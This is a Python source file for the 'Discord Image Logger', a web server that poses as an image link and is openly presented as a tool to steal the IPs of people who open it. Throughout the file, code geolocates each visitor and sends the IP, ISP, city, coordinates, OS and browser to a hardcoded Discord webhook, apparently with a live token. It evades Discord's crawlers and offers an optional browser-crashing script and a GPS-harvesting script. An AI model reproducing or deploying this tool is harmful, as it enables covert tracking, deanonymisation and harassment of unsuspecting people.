# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1212047706722406410/0awVKWO8LF-E5atUZG1OrdRbYeHhGhN54IIjdDWNHA03sFx1blz4_P-UGoZiacDPh3U1",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "???", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "Bu arkadaş loglandı :D", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
